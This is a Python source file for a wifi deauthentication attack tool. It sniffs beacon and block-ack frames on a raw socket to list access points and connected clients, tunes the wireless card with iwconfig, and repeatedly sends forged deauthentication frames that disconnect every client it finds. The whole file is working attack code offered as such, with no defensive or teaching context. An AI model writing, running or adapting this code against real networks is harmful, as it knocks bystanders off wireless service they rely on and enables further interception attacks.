import socket
import subprocess
from lib.Deauth import Deauth
from lib.Logger import Logger
from lib.Target import Target
from lib.APManager import APManager
from lib.AccessPoint import AccessPoint
from frames.Radiotap802_11 import Radiotap802_11

class WifiDeautAttack():
    @staticmethod
    def run(form):
        ap_manager = APManager()

        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        s.bind((form.interface, 0x0003))

        while True:
            frame = Radiotap802_11(s.recvfrom(2048)[0])
            
            if frame.isBeaconFrame():
                    ap = AccessPoint(frame.ssid, frame.channel, frame.bssid_id)
                    ap_manager.addAP(ap)
            elif frame.isAckBlockFrame():
                target = Target(frame.destination)
                ap_manager.addTarget(target, frame.source)

            for ap in ap_manager.ap_list:
                if len(ap.targets) > 0:
                    process = subprocess.Popen("iwconfig {} channel {} > /dev/null 2>&1".format(form.interface, ap.channel), shell=True, stdout=subprocess.PIPE)
                    process.wait()

                for target in ap.targets:
                    Logger.log("!!!!deauthing {}".format(target.mac))
                    deauth_frame = Deauth.getDeauthFrame(ap, target)
                    for x in range(0, 3):
                        s.send(deauth_frame)
                    ap.targets.remove(target)

            